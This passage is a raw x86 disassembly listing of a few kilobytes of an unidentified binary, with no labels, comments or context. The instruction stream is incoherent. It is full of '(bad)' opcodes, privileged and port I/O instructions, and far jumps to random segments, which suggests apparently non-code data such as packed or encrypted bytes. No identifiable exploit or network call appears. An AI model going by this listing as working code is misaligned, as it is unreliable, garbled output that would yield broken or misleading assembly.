  41890e:	fnstcw WORD PTR [esi-0x49]
  418911:	leave  
  418912:	pusha  
  418913:	ins    DWORD PTR es:[edi],dx
  418914:	test   esi,eax
  418916:	aad    0x55
  418918:	add    al,0xd8
  41891a:	mov    ds:0xa470d106,eax
  41891f:	pop    ebp
  418920:	mov    WORD PTR [ecx+0x43],es
  418923:	cdq    
  418924:	frstpm(287 only) 
  418926:	inc    ebp
  418927:	pop    esp
  418928:	daa    
  418929:	and    DWORD PTR [edx-0x1e483f2b],edi
  41892f:	inc    esi
  418930:	add    BYTE PTR [edx+0x2c],0xdb
  418934:	jno    0x418902
  418936:	pop    esi
  418937:	pop    ds
  418938:	xchg   ebp,eax
  418939:	clc    
  41893a:	xchg   BYTE PTR [ebx],ch
  41893c:	fisub  DWORD PTR [edx+0x62915920]
  418942:	das    
  418943:	(bad)  [esi+0x75192865]
  418949:	lock xlat BYTE PTR ds:[ebx]
  41894b:	or     BYTE PTR [edx],ch
  41894d:	fdiv   st(1),st
  41894f:	mov    DWORD PTR [edx+edi*8-0x58],0x7eb95d09
  418957:	adc    DWORD PTR [eax-0x47],0x27e5e631
  41895e:	cs adc al,0x80
  418961:	call   0xd376:0x331e3ddd
  418968:	icebp  
  418969:	mov    dl,0x68
  41896b:	pop    ss
  41896c:	sub    bh,dh
  41896e:	into   
  41896f:	jg     0x4189c8
  418971:	lock into 
  418973:	aas    
  418974:	xlat   BYTE PTR ds:[ebx]
  418975:	loopne 0x4189c6
  418977:	fcomip st,st(5)
  418979:	ins    BYTE PTR es:[edi],dx
  41897a:	dec    eax
  41897b:	ss cmp eax,0xa0e956f3
  418981:	or     BYTE PTR [eax-0x52],al
  418984:	adc    esi,esp
  418986:	cld    
  418987:	sbb    BYTE PTR [esp+eiz*2],0xab
  41898b:	mov    WORD PTR [esi-0x29],cs
  41898e:	cs std 
  418990:	ins    DWORD PTR es:[edi],dx
  418991:	ds pop edx
  418993:	mov    al,0xc1
  418995:	push   cs
  418996:	rcl    DWORD PTR ds:0x1cff934e,0x49
  41899d:	out    dx,eax
  41899e:	addr16 xchg esi,edx
  4189a1:	imul   edi,esp
  4189a4:	or     ebx,DWORD PTR [ecx+edi*8-0x775e5606]
  4189ab:	xchg   DWORD PTR [ecx+0x4],ecx
  4189ae:	into   
  4189af:	pop    ebp
  4189b0:	ss pop ds
  4189b2:	loop   0x418a1f
  4189b4:	popa   
  4189b5:	fmul   DWORD PTR [ecx-0x31]
  4189b8:	fst    DWORD PTR ds:0xf0433e8d
  4189be:	mov    es:0x3bc053e3,al
  4189c4:	and    al,0x2c
  4189c6:	sub    bl,dl
  4189c8:	loop   0x4189d5
  4189ca:	out    dx,al
  4189cb:	jge    0x418965
  4189cd:	mov    al,ds:0x9b79390b
  4189d2:	push   ss
  4189d3:	push   edx
  4189d4:	es fadd st(5),st
  4189d7:	repnz sub DWORD PTR [ebx],eax
  4189da:	cmp    ch,BYTE PTR [edx]
  4189dc:	ds scas al,BYTE PTR es:[edi]
  4189de:	fs and al,0x53
  4189e1:	inc    eax
  4189e2:	xchg   esi,eax
  4189e3:	mov    al,0x89
  4189e5:	and    eax,0x46421918
  4189ea:	xor    DWORD PTR ds:0x58737abd,edi
  4189f0:	pop    esi
  4189f1:	fwait
  4189f2:	int3   
  4189f3:	fdiv   QWORD PTR [ebx-0x2ab669ca]
  4189f9:	clc    
  4189fa:	pop    ss
  4189fb:	add    ch,BYTE PTR [ebx-0x1fc983b1]
  418a01:	jae    0x418a14
  418a03:	mov    bh,0x3e
  418a05:	(bad)  
  418a06:	push   ds
  418a07:	adc    al,0xb5
  418a09:	and    eax,DWORD PTR [ebx+0x49ef3104]
  418a0f:	hlt    
  418a10:	sub    edx,DWORD PTR ds:0x26bc47c
  418a16:	mov    ah,0x64
  418a18:	hlt    
  418a19:	out    dx,eax
  418a1a:	(bad)  
  418a1b:	fdiv   st,st(2)
  418a1d:	xor    ebp,DWORD PTR [ebx]
  418a1f:	out    0x7,al
  418a21:	xchg   ecx,eax
  418a22:	dec    dl
  418a24:	repz div ebp
  418a27:	pop    ds
  418a28:	js     0x4189e8
  418a2a:	jg     0x418a0d
  418a2c:	test   eax,0x79bcc616
  418a31:	jg     0x4189f8
  418a33:	aad    0xf6
  418a35:	call   0x77a6:0x8810db69
  418a3c:	retf   
  418a3d:	mov    esi,0x237db750
  418a42:	int    0x3f
  418a44:	rcr    BYTE PTR [eax+0x1e09e961],cl
  418a4a:	xor    eax,ecx
  418a4c:	outs   dx,DWORD PTR ds:[esi]
  418a4d:	mov    bl,0xe9
  418a4f:	shl    eax,1
  418a51:	fstp   QWORD PTR [ebx+0xe]
  418a54:	aas    
  418a55:	mul    DWORD PTR [eax+0x5f717f88]
  418a5b:	xor    cl,BYTE PTR [eax]
  418a5d:	pop    edx
  418a5e:	mov    al,ds:0x4887fbc2
  418a63:	xchg   ebx,eax
  418a64:	arpl   bp,si
  418a66:	inc    edi
  418a67:	(bad)  
  418a68:	retf   0x1892
  418a6b:	lods   al,BYTE PTR ds:[esi]
  418a6c:	jno    0x418aaa
  418a6e:	sub    al,0xb2
  418a70:	out    0x6f,eax
  418a72:	sub    esp,DWORD PTR [edi+0x6]
  418a75:	jbe    0x418a56
  418a77:	jge    0x418aa3
  418a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a7a:	xchg   BYTE PTR [edx],dh
  418a7c:	adc    bh,cl
  418a7e:	mov    bh,0xa9
  418a80:	(bad)  
  418a81:	cmp    eax,0xedb351fb
  418a86:	mov    ebp,0xeba8251a
  418a8b:	pop    esp
  418a8c:	shl    DWORD PTR ds:0x1b1b94ef,0x13
  418a93:	pop    esp
  418a94:	out    0x67,al
  418a96:	inc    ecx
  418a97:	push   edx
  418a98:	stos   BYTE PTR es:[edi],al
  418a99:	lods   al,BYTE PTR ds:[esi]
  418a9a:	ins    DWORD PTR es:[edi],dx
  418a9b:	and    edx,edx
  418a9d:	test   cl,ah
  418a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418aa0:	lock push ebp
  418aa2:	jp     0x418a49
  418aa4:	idiv   BYTE PTR [ebx+0x5e7c5d85]
  418aaa:	(bad)  
  418aab:	xor    bh,BYTE PTR [esi]
  418aad:	mov    bh,0xd6
  418aaf:	lods   al,BYTE PTR ds:[esi]
  418ab0:	arpl   bx,si
  418ab2:	and    cl,bl
  418ab4:	cmc    
  418ab5:	popf   
  418ab6:	sub    eax,0x27ff66da
  418abb:	inc    esp
  418abc:	enter  0xfe42,0xe0
  418ac0:	jo     0x418b32
  418ac2:	or     cl,BYTE PTR [ebx+0x7d54b01]
  418ac8:	sbb    BYTE PTR [ebx],al
  418aca:	js     0x418ab6
  418acc:	sti    
  418acd:	scas   al,BYTE PTR es:[edi]
  418ace:	int3   
  418acf:	ins    DWORD PTR es:[edi],dx
  418ad0:	push   ecx
  418ad1:	cwde   
  418ad2:	fld    st(4)
  418ad4:	imul   DWORD PTR [ecx+0x1d]
  418ad7:	xor    al,0x6c
  418ad9:	push   ebp
  418ada:	push   cs
  418adb:	lock inc edx
  418add:	dec    ebx
  418ade:	mov    ebx,0x9b28ae90
  418ae3:	repnz jmp FWORD PTR [edx]
  418ae6:	adc    esp,esi
  418ae8:	imul   ebx,DWORD PTR [edi+0x2],0x4323372e
  418aef:	mov    BYTE PTR [edi+0x5ec5e3e1],dl
  418af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418af6:	aad    0x74
  418af8:	shl    DWORD PTR [eax],0xe2
  418afb:	cmp    al,0x4e
  418afd:	mov    al,0x4
  418aff:	fwait
  418b00:	das    
  418b01:	or     cl,BYTE PTR [esi+0x61542743]
  418b07:	ret    0x47e5
  418b0a:	inc    esi
  418b0b:	arpl   WORD PTR ss:[ebx-0x7],dx
  418b0f:	int    0xac
  418b11:	xor    eax,DWORD PTR [edi]
  418b13:	loop   0x418b6a
  418b15:	int3   
  418b16:	jnp    0x418ac0
  418b18:	mov    al,ds:0x8c720df4
  418b1d:	ins    DWORD PTR es:[edi],dx
  418b1e:	data16 sub cl,BYTE PTR fs:[esi+0x34]
  418b23:	push   esi
  418b24:	mov    edi,0xf4244c3f
  418b29:	adc    eax,0xb3ddf2ec
  418b2e:	je     0x418b6e
  418b30:	test   al,0xad
  418b32:	inc    edx
  418b33:	outs   dx,BYTE PTR ds:[esi]
  418b34:	fstp   QWORD PTR [edi+ecx*4+0x6ab21bef]
  418b3b:	push   esi
  418b3c:	scas   eax,DWORD PTR es:[edi]
  418b3d:	jo     0x418aed
  418b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b40:	cmp    ebx,DWORD PTR [ebx+0x6f519010]
  418b46:	xor    eax,DWORD PTR [eax-0x1f]
  418b49:	jge    0x418b28
  418b4b:	ds push ecx
  418b4d:	out    dx,al
  418b4e:	inc    esp
  418b4f:	dec    esi
  418b50:	mov    dl,0xcd
  418b52:	(bad)  
  418b54:	outs   dx,DWORD PTR ds:[esi]
  418b55:	add    al,0xbf
  418b57:	mov    al,0x7a
  418b59:	mov    ebp,DWORD PTR [esi-0x8198fc8]
  418b5f:	mov    cl,0x6f
  418b61:	leave  
  418b62:	xchg   esp,eax
  418b63:	sbb    eax,0x765d225e
  418b68:	pusha  
  418b69:	iret   
  418b6a:	dec    ebp
  418b6b:	cmc    
  418b6c:	rcr    dh,cl
  418b6e:	pop    ds
  418b6f:	push   ecx
  418b70:	xor    ebx,DWORD PTR [edx-0x7a]
  418b73:	xchg   ecx,eax
  418b74:	clc    
  418b75:	or     dl,al
  418b77:	adc    esi,eax
  418b79:	cld    
  418b7a:	or     eax,0x5ee2ac79
  418b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b80:	mov    eax,ds:0xb2907182
  418b85:	or     dl,BYTE PTR [ecx]
  418b87:	loop   0x418bc2
  418b89:	sahf   
  418b8a:	jae    0x418b2a
  418b8c:	pop    es
  418b8d:	xlat   BYTE PTR ds:[ebx]
  418b8e:	xor    BYTE PTR [edx-0x54a06326],al
  418b94:	rcl    esp,cl
  418b96:	das    
  418b97:	jge    0x418b86
  418b99:	cmp    BYTE PTR [eax],0xb0
  418b9c:	xor    bl,bh
  418b9e:	gs push cs
  418ba0:	pop    eax
  418ba1:	fcom   QWORD PTR [ebx+ebp*1]
  418ba4:	add    al,0x50
  418ba6:	loopne 0x418bb5
  418ba8:	pop    ebx
  418ba9:	aas    
  418baa:	in     al,0x19
  418bac:	xchg   ebx,eax
  418bad:	xor    edi,ebx
  418baf:	fnstsw WORD PTR [edi-0x18]
  418bb2:	les    edx,FWORD PTR [eax]
  418bb4:	cmc    
  418bb5:	in     eax,dx
  418bb6:	out    dx,eax
  418bb7:	sub    eax,0x69eb33f3
  418bbc:	and    BYTE PTR ds:0xf275dda6,bh
  418bc2:	ins    DWORD PTR es:[edi],dx
  418bc3:	mov    edx,0x1a5f3bfb
  418bc8:	(bad)  
  418bc9:	lods   al,BYTE PTR es:[esi]
  418bcb:	test   DWORD PTR [ecx+0x31],ebx
  418bce:	ficomp DWORD PTR [eax]
  418bd0:	jmp    0x1a0f:0x6e5f82c3
  418bd7:	pop    edi
  418bd8:	xchg   DWORD PTR [esi-0x14],eax
  418bdb:	pop    ecx
  418bdc:	jmp    0x3a29:0xd4899e1a
  418be3:	ja     0x418c38
  418be5:	mov    al,ds:0xcc41d325
  418bea:	or     ch,BYTE PTR [edi-0x30]
  418bed:	cs push 0xffffffbc
  418bf0:	jo     0x418bb5
  418bf2:	and    edx,DWORD PTR [esi+ebx*1+0x6e]
  418bf6:	mov    ah,0xc5
  418bf8:	imul   ebx,DWORD PTR [edi-0x37],0xf0982cfe
  418bff:	or     BYTE PTR [ebx+0x1c],0xf6
  418c03:	adc    al,0x57
  418c05:	inc    ebp
  418c06:	sub    ebx,0x844a909f
  418c0c:	mov    ah,0x8c
  418c0e:	aam    0xfc
  418c10:	pop    es
  418c11:	mov    cl,bh
  418c13:	(bad)  
  418c14:	call   0x74a3:0x164c4070
  418c1b:	int3   
  418c1c:	ss dec ebp
  418c1e:	ret    
  418c1f:	je     0x418bb6
  418c21:	div    BYTE PTR [esi-0x541262a9]
  418c27:	sar    BYTE PTR [edi-0x3648875d],cl
  418c2d:	cmp    al,0xd4
  418c2f:	inc    DWORD PTR [edi+ebx*4-0xaea6d80]
  418c36:	inc    esi
  418c37:	jne    0x418bce
  418c39:	(bad)  
  418c3a:	test   al,0x37
  418c3c:	mov    edx,0x91117736
  418c41:	add    ch,BYTE PTR [edx+0x677681df]
  418c47:	not    BYTE PTR [esi+ebx*8-0x3c]
  418c4b:	jmp    0xafcb:0xcda52aa0
  418c52:	loopne 0x418bf6
  418c54:	cmp    BYTE PTR [esp+ecx*2-0x171ebcf0],ah
  418c5b:	add    eax,0xb925d5d7
  418c60:	xchg   ebx,eax
  418c61:	test   eax,0xbd292079
  418c66:	xor    BYTE PTR ds:0x4a08c2b,bl
  418c6c:	mov    al,ds:0x874a1e9f
  418c71:	or     ebx,DWORD PTR [esi-0x74]
  418c74:	inc    ecx
  418c75:	popf   
  418c76:	sub    al,0xdb
  418c78:	xor    al,0xa2
  418c7a:	es and ebx,edi
  418c7d:	xor    esp,DWORD PTR [eax]
  418c7f:	cmp    ebx,DWORD PTR [ebx+esi*4]
  418c82:	ins    BYTE PTR es:[edi],dx
  418c83:	jo     0x418c47
  418c85:	jl     0x418cc6
  418c87:	cmc    
  418c88:	mov    ds:0x55260664,eax
  418c8d:	fnsave [edi+0x7366c41c]
  418c93:	and    BYTE PTR [eax],0xfb
  418c96:	cld    
  418c97:	mov    dh,0xa4
  418c99:	fiadd  DWORD PTR [edx]
  418c9b:	pushf  
  418c9c:	(bad)  
  418c9d:	push   eax
  418c9e:	adc    eax,0xd3b80979
  418ca3:	pop    ebx
  418ca4:	push   DWORD PTR [edx]
  418ca6:	cmp    DWORD PTR [eax],esp
  418ca8:	int3   
  418ca9:	pop    ebx
  418caa:	repnz adc DWORD PTR ds:0xb912cd4b,0xf8184233
  418cb5:	mov    cl,0x26
  418cb7:	mov    ah,0xff
  418cb9:	adc    ecx,esi
  418cbb:	inc    eax
  418cbc:	in     eax,0xa0
  418cbe:	sbb    ebp,ecx
  418cc0:	cld    
  418cc1:	(bad)
  418cc4:	js     0x418cb8
  418cc6:	mov    eax,ds:0x82ab09e
  418ccb:	mov    al,ds:0x1dd86418
  418cd0:	fxam   
  418cd2:	mov    edi,0x50b88725
  418cd7:	imul   ebx,edi,0x537bb316
  418cdd:	adc    ch,BYTE PTR [ecx+0x6c]
  418ce0:	dec    ebx
  418ce1:	call   0x125ab4f9
  418ce6:	clc    
  418ce7:	outs   dx,DWORD PTR ds:[esi]
  418ce8:	add    al,0x9f
  418cea:	mul    DWORD PTR [edi+0x5b]
  418ced:	lods   al,BYTE PTR ds:[esi]
  418cee:	fsubr  st(3),st
  418cf0:	or     bl,dh
  418cf2:	mov    ?,WORD PTR [edx-0x2318d8b6]
  418cf8:	aaa    
  418cf9:	iret   
  418cfa:	mov    eax,ds:0x4a585746
  418cff:	pop    edi
  418d00:	lods   eax,DWORD PTR ds:[esi]
  418d01:	dec    edi
  418d02:	(bad)  
  418d03:	mov    ds:0xd1e6124d,al
  418d08:	in     al,0x2e
  418d0a:	sub    BYTE PTR [edx-0x3aece4ae],0xa5
  418d11:	mov    eax,0x4bdeac76
  418d16:	out    0xff,eax
  418d18:	call   0xbb883418
  418d1d:	inc    esp
  418d1e:	push   eax
  418d1f:	cmc    
  418d20:	arpl   dx,bx
  418d22:	dec    eax
  418d23:	arpl   WORD PTR [edi+0x4a],dx
  418d26:	xor    BYTE PTR [esi-0x6bfa5c09],al
  418d2c:	xor    ch,BYTE PTR [eax-0x54]
  418d2f:	repz xchg ebp,eax
  418d31:	test   al,0x5d
  418d33:	lea    edi,[ecx+0x61]
  418d36:	mov    ebp,0x2e040b26
  418d3b:	xor    al,0xf5
  418d3d:	das    
  418d3e:	cmp    eax,edx
  418d40:	adc    dl,bl
  418d42:	push   ecx
  418d43:	push   ss
  418d44:	jle    0x418d72
  418d46:	jns    0x418d57
  418d48:	xchg   ecx,eax
  418d49:	div    DWORD PTR [eax+0x77]
  418d4c:	out    0xcb,eax
  418d4e:	pop    ebp
  418d4f:	add    al,bh
  418d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d52:	mov    ch,0x4e
  418d54:	and    ebp,DWORD PTR [ebx-0x1efa5c51]
  418d5a:	mov    bl,0x93
  418d5c:	jmp    0x1b6:0xef5688ef
  418d63:	enter  0xf8d8,0x58
  418d67:	inc    edx
  418d68:	pop    ss
  418d69:	mov    WORD PTR [ebx-0x4da73b7d],fs
  418d6f:	mov    dh,0x2c
  418d71:	ror    BYTE PTR [ebp+0x78],0xd2
  418d75:	enter  0x7e08,0x97
  418d79:	call   0x68b4:0x19497d26
  418d80:	adc    ebx,DWORD PTR [eax-0x6c]
  418d83:	in     eax,0xda
  418d85:	ins    BYTE PTR es:[edi],dx
  418d86:	ins    DWORD PTR es:[edi],dx
  418d87:	cmp    BYTE PTR [edx+ebx*2-0x823909f],ch
  418d8e:	in     eax,dx
  418d8f:	push   edi
  418d90:	cmp    al,0xde
  418d92:	xor    BYTE PTR [edx+0x6f26a9e5],ah
  418d98:	daa    
  418d99:	xchg   BYTE PTR es:[ecx+0x3432c29],dl
  418da0:	loope  0x418d95
  418da2:	mov    eax,0xb8951b2e
  418da7:	popa   
  418da8:	je     0x418dac
  418daa:	ror    BYTE PTR [esi-0x1b],cl
  418dad:	(bad)  
  418dae:	push   edi
  418daf:	pop    edx
  418db0:	jnp    0x418d37
  418db2:	in     eax,dx
  418db3:	rol    DWORD PTR [ebx-0x5982cca7],cl
  418db9:	xchg   esi,eax
  418dba:	loopne 0x418d50
  418dbc:	xchg   edx,eax
  418dbd:	lahf   
  418dbe:	or     DWORD PTR [edi],esi
  418dc0:	mov    dh,0x94
  418dc2:	and    BYTE PTR [esi],dh
  418dc4:	xor    eax,0x9c3ecba5
  418dc9:	xchg   BYTE PTR [esi],ah
  418dcb:	cmp    BYTE PTR [ebx+0x52],0xc
  418dcf:	int3   
  418dd0:	push   edi
  418dd1:	ja     0x418de6
  418dd3:	div    BYTE PTR [ecx+0x19]
  418dd6:	push   esi
  418dd7:	jge    0x418db6
  418dd9:	pop    esp
  418dda:	(bad)  
  418ddb:	loope  0x418e5b
  418ddd:	stc    
  418dde:	retf   0xab67
  418de1:	lods   eax,DWORD PTR ds:[esi]
  418de2:	daa    
  418de3:	sbb    edi,ebp
  418de5:	cmp    al,BYTE PTR [eax+0x3d]
  418de8:	mov    ecx,0xfc56be59
  418ded:	sbb    ebp,DWORD PTR [eax]
  418def:	xor    BYTE PTR [edi],0xaa
  418df2:	push   edi
  418df3:	ret    
  418df4:	cmp    al,0x24
  418df6:	cli    
  418df7:	cmp    eax,0xbd480be7
  418dfc:	ja     0x418d89
  418dfe:	jns    0x418da5
  418e00:	scas   al,BYTE PTR es:[edi]
  418e01:	or     edx,eax
  418e03:	ins    BYTE PTR es:[edi],dx
  418e04:	push   edx
  418e05:	jle    0x418db2
  418e07:	pop    esp
  418e08:	pop    ds
  418e09:	lahf   
  418e0a:	call   0x11cdd044
  418e0f:	loop   0x418da1
  418e11:	pop    ss
  418e12:	sub    eax,DWORD PTR [edx+ecx*1]
  418e15:	sub    al,0x15
  418e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e18:	cli    
  418e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e1a:	pop    eax
  418e1b:	js     0x418e6b
  418e1d:	int3   
  418e1e:	out    0xb8,al
  418e20:	or     al,0xee
  418e22:	jg     0x418e83
  418e24:	dec    esi
  418e25:	(bad)  [edi-0x21]
  418e28:	push   0xffffff89
  418e2a:	push   ds
  418e2b:	xor    al,0xe7
  418e2d:	shl    DWORD PTR [edx+0x19],0xf3
  418e31:	mov    ebx,ss
  418e33:	sahf   
  418e34:	or     eax,0xb765d6d8
  418e39:	add    BYTE PTR [edx-0x6f],ch
  418e3c:	xchg   edi,eax
  418e3d:	mov    bl,0x39
  418e3f:	pop    esi
  418e40:	(bad)  
  418e41:	aaa    
  418e42:	fisub  DWORD PTR [si]
  418e45:	pop    edx
  418e46:	jns    0x418e98
  418e48:	sub    al,0xad
  418e4a:	sbb    cl,BYTE PTR [esi-0x3c]
  418e4d:	dec    edi
  418e4e:	jmp    0x234b:0xa72743bd
  418e55:	inc    eax
  418e56:	push   0x18
  418e58:	mov    edx,DWORD PTR [eax+eax*2-0x6]
  418e5c:	xchg   edx,eax
  418e5d:	add    esi,ecx
  418e5f:	popf   
  418e60:	adc    dh,BYTE PTR [eax]
  418e62:	sub    cl,BYTE PTR [edx+0x3b9bd1e8]
  418e68:	(bad)  
  418e69:	jns    0x418edf
  418e6b:	int    0x6
  418e6d:	sub    cl,bl
  418e6f:	inc    esi
  418e70:	hlt    
  418e71:	adc    eax,0x8479d9c
  418e76:	mov    edi,0xefa416e4
  418e7b:	mov    eax,0x7aeb3347
  418e80:	xor    al,0xad
  418e82:	add    al,0x42
  418e84:	push   eax
  418e85:	sub    DWORD PTR cs:[edx-0x53],ecx
  418e89:	jge    0x418f01
  418e8b:	and    DWORD PTR [edi],ecx
  418e8d:	ret    
  418e8e:	aaa    
  418e8f:	push   ebx
  418e90:	aad    0x26
  418e92:	xchg   eax,ecx
  418e94:	je     0x418ee0
  418e96:	int3   
  418e97:	outs   dx,BYTE PTR ds:[esi]
  418e98:	into   
  418e99:	loope  0x418e3c
  418e9b:	scas   eax,DWORD PTR es:[edi]
  418e9c:	shl    BYTE PTR [ecx+edx*4+0x4a],0x21
  418ea1:	push   es
  418ea2:	sbb    eax,0x346150d
  418ea7:	sub    BYTE PTR [ebx+0x2a37e3a6],ah
  418ead:	sub    al,0xd6
  418eaf:	rcl    DWORD PTR [edx+0x1d563372],cl
  418eb5:	addr16 inc ebp
  418eb7:	outs   dx,DWORD PTR ds:[esi]
  418eb8:	push   cs
  418eb9:	mov    al,ds:0x2c3158f4
  418ebe:	cdq    
  418ebf:	or     DWORD PTR [ebx-0x64],ebp
  418ec2:	mov    ebp,0x75b38f8f
  418ec7:	lock sti 
  418ec9:	mov    bl,0x69
  418ecb:	or     ah,bh
  418ecd:	jae    0x418ef7
  418ecf:	les    ebx,FWORD PTR [eax+ecx*2-0x1bb189ca]
  418ed6:	xor    al,BYTE PTR [eax-0x38]
  418ed9:	out    dx,al
  418eda:	fwait
  418edb:	jb     0x418f1f
  418edd:	gs cdq 
  418edf:	dec    esi
  418ee0:	sub    eax,DWORD PTR [ecx]
  418ee2:	mov    cl,0x6e
  418ee4:	std    
  418ee5:	fmul   st,st(4)
  418ee7:	xor    BYTE PTR [edi],dh
  418ee9:	stos   BYTE PTR es:[edi],al
  418eea:	enter  0x89c7,0x3d
  418eee:	shl    DWORD PTR [eax+ebx*2],1
  418ef1:	popa   
  418ef2:	iret   
  418ef3:	ja     0x418e8d
  418ef5:	test   eax,0x93d28277
  418efa:	pop    sp
  418efc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418efd:	popa   
  418efe:	mov    dl,0x92
  418f00:	push   eax
  418f01:	dec    edi
  418f02:	cld    
  418f03:	leave  
  418f04:	pop    ebp
  418f05:	ror    BYTE PTR [esi],0x1a
  418f08:	sub    eax,DWORD PTR [edi]
  418f0a:	outs   dx,BYTE PTR ds:[esi]
  418f0b:	sub    al,0x17
  418f0d:	push   eax
  418f0e:	pop    edx
  418f0f:	adc    ah,BYTE PTR [esp+esi*4]
  418f12:	stos   BYTE PTR es:[edi],al
  418f13:	mov    ah,0x90
  418f15:	(bad)  
  418f16:	add    WORD PTR [esi-0x4720aa63],cx
  418f1d:	jg     0x418ec6
  418f1f:	add    edi,ecx
  418f21:	push   esi
  418f22:	stos   DWORD PTR es:[edi],eax
  418f23:	and    eax,0x66672d45
  418f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f29:	mov    dl,0xda
  418f2b:	ds aas 
  418f2d:	cmp    eax,0x4bafc402
  418f32:	ror    BYTE PTR [esi],1
  418f34:	adc    al,0xed
  418f36:	and    dl,dl
  418f38:	rcr    edx,0xeb
  418f3b:	jnp    0x418f6b
  418f3d:	inc    edi
  418f3e:	fcmovnu st,st(5)
  418f40:	rcr    dl,cl
  418f42:	inc    edx
  418f43:	push   edx
  418f44:	dec    esp
  418f45:	mov    BYTE PTR [eax+ebp*2],bh
  418f48:	add    BYTE PTR [esi-0x51],cl
  418f4b:	ins    BYTE PTR es:[edi],dx
  418f4c:	lea    ebp,[edx]
  418f4e:	sahf   
  418f4f:	(bad)  
  418f50:	imul   esp,ecx,0xffffffdc
  418f53:	in     eax,0x78
  418f55:	mov    DWORD PTR [esi-0x1bf315f8],esp
  418f5b:	and    al,0x47
  418f5d:	(bad)  
  418f5e:	stos   DWORD PTR es:[edi],eax
  418f5f:	xor    DWORD PTR [ebx+0x5e],edx
  418f62:	xlat   BYTE PTR ds:[ebx]
  418f63:	add    DWORD PTR [ebx+0x3575bd8d],edi
  418f69:	cwde   
  418f6a:	sbb    eax,esp
  418f6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f6d:	adc    BYTE PTR [ebp+0x192b7574],ch
  418f73:	xor    esi,esi
  418f75:	xchg   edi,eax
  418f76:	push   esp
  418f77:	inc    ebp
  418f78:	(bad)  
  418f79:	leave  
  418f7a:	into   
  418f7b:	mov    cl,0x3a
  418f7d:	int3   
  418f7e:	scas   al,BYTE PTR es:[edi]
  418f7f:	fnstsw WORD PTR [eax+0x4f04775f]
  418f85:	push   esp
  418f86:	dec    edi
  418f87:	es jae 0x418fc0
  418f8a:	jl     0x418f0e
  418f8c:	add    ah,dl
  418f8e:	jp     0x418f60
  418f90:	mov    esp,0xae88286b
  418f95:	retf   0x2b48
  418f98:	ror    edi,cl
  418f9a:	test   eax,0x404be55b
  418f9f:	jbe    0x418f71
  418fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fa2:	xor    ebp,DWORD PTR [ebp-0x15e19365]
  418fa8:	mov    ds:0xc7625823,eax
  418fad:	inc    eax
  418fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418faf:	cmp    eax,0x524fda79
  418fb4:	sub    al,0x48
  418fb6:	dec    esi
  418fb7:	sub    ebp,DWORD PTR [edx]
  418fb9:	xchg   ebp,eax
  418fba:	and    al,0xbb
  418fbc:	outs   dx,BYTE PTR ds:[esi]
  418fbd:	mov    gs,WORD PTR [ebx]
  418fbf:	into   
  418fc0:	enter  0x9549,0xb8
  418fc4:	adc    bh,BYTE PTR [edx+0x612acca7]
  418fca:	call   0x6cfd:0x6fd2c796
  418fd1:	iret   
  418fd2:	push   edi
  418fd3:	jecxz  0x418fe5
  418fd5:	mov    esi,0x102d9e97
  418fda:	cmp    al,0x23
  418fdc:	mov    ebx,DWORD PTR [edx-0x3d]
  418fdf:	sar    edi,cl
  418fe1:	and    eax,0x3f70d790
  418fe6:	addr16 in al,dx
  418fe8:	dec    esi
  418fe9:	inc    eax
  418fea:	adc    ah,al
  418fec:	mov    al,0xb6
  418fee:	test   eax,0xba374a1d
  418ff3:	imul   ebp,DWORD PTR [ebx-0x398de20c],0x3b
  418ffa:	inc    edi
  418ffb:	xor    BYTE PTR [ebp+ebp*8-0x542f71e8],dh
  419002:	jmp    0x418f97
  419004:	push   ecx
  419005:	adc    al,0xa9
  419007:	gs mov es,edi
  41900a:	sbb    al,0xea
  41900c:	stos   DWORD PTR es:[edi],eax
  41900d:	cdq    
  41900e:	add    al,0xdf
  419010:	(bad)  
  419011:	lods   al,BYTE PTR ds:[esi]
  419012:	sbb    eax,eax
  419014:	outs   dx,BYTE PTR ds:[esi]
  419015:	int3   
  419016:	mov    ds:0x3f4234be,eax
  41901b:	jne    0x418fcf
  41901d:	shr    BYTE PTR [ecx+0x73446ada],1
  419023:	jl     0x419051
  419025:	shl    bh,cl
  419027:	xlat   BYTE PTR ds:[ebx]
  419028:	popa   
  419029:	lahf   
  41902a:	out    dx,eax
  41902b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41902c:	mov    dh,0x80
  41902e:	sbb    eax,0x1eb43885
  419033:	inc    ebx
  419034:	xchg   edx,eax
  419035:	cmp    BYTE PTR [eax],ch
  419037:	ds pop ebp
  419039:	outs   dx,BYTE PTR ds:[esi]
  41903a:	pusha  
  41903b:	push   ebx
  41903c:	pop    edx
  41903d:	popa   
  41903e:	inc    edx
  41903f:	ds mov ecx,0x6c641e50
  419045:	mov    al,ds:0xfdcc50a4
  41904a:	pushf  
  41904b:	xor    ecx,DWORD PTR [edx+0x79abe88b]
  419051:	mov    cl,0xf5
  419053:	and    BYTE PTR gs:[edi+0x3adf864b],al
  41905a:	fld    DWORD PTR [eax-0x7e9b0070]
  419060:	daa    
  419061:	ja     0x418fe6
  419063:	daa    
  419064:	xchg   ecx,eax
  419065:	pop    eax
  419066:	out    dx,al
  419067:	lea    ebx,[ebx+0x7]
  41906a:	rcl    DWORD PTR [ebx+0x247a771b],1
  419070:	mov    ebx,DWORD PTR [ecx]
  419072:	or     BYTE PTR [esi-0x7e],dh
  419075:	sub    al,0x40
  419077:	and    edx,DWORD PTR [eax]
  419079:	pop    ecx
  41907a:	mov    dl,0x44
  41907c:	xor    al,ch
  41907e:	pop    esp
  41907f:	lds    ebx,FWORD PTR [edi]
  419081:	pop    esi
  419082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419083:	pop    eax
  419084:	aas    
  419085:	mov    DWORD PTR [eax],edx
  419087:	xchg   ecx,eax
  419088:	sti    
